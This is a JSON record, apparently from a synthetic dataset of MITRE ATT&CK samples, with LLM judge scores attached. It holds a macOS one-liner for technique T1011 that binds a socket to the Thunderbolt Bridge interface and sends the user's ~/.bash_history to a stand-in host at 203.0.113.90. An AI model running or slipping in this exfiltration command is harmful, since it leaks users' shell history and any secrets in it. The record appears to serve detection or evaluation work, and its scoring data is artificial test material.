{
  "technique_id": "T1011",
  "platform": "macOS",
  "shell": "Bash",
  "command": "IP=\"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\"; python3 -c \"import socket; s=socket.socket(); s.bind(('\"$IP\"',0)); s.connect(('203.0.113.90',54921)); s.sendall(open('/Users/$USER/.bash_history','rb').read()); s.close()\"",
  "explanation": "Executes a Python TCP client bound to the Thunderbolt Bridge IP to exfiltrate content over a non-primary interface, consistent with T1011.",
  "rationale_steps": [
    "Get Thunderbolt Bridge IP via networksetup",
    "Bind a user-space TCP socket to that IP",
    "Send file content to a high, uncommon port"
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1011-641961f7-6b36bb00",
  "source_prompt_hash": "641961f7",
  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Balanced quoting and command substitution are correct, and the inline Python code is syntactically valid after shell variable expansion.",
        "semantic_score": 4,
        "semantic_justification": "It programmatically exfiltrates a file over TCP bound to a specific interface consistent with automated exfiltration, though reliability gaps exist (e.g., Thunderbolt Bridge IP may be absent and .bash_history may not exist).",
        "combined_score": 4.5,
        "confidence": 1,
        "timestamp": "2025-10-01T04:48:00.171919Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid variable assignment, correct awk syntax, and properly structured Python code with appropriate quoting and escaping.",
        "semantic_score": 5,
        "semantic_justification": "The command fully implements automated exfiltration by extracting the Thunderbolt Bridge IP address, creating a Python socket connection to an external server (203.0.113.90:54921), and automatically transferring the user's bash history file, which aligns perfectly with the T1011 technique.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T04:48:03.518917Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, featuring correct variable assignment, command substitution, balanced quoting, and valid Bash and Python syntax for all components.",
        "semantic_score": 5,
        "semantic_justification": "The command accurately leverages macOS specific tools to identify an interface IP, then uses Python to bind to it and exfiltrate sensitive data via TCP, perfectly aligning with T1011's automated exfiltration over a non-primary interface.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T06:09:41.738203Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.833,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}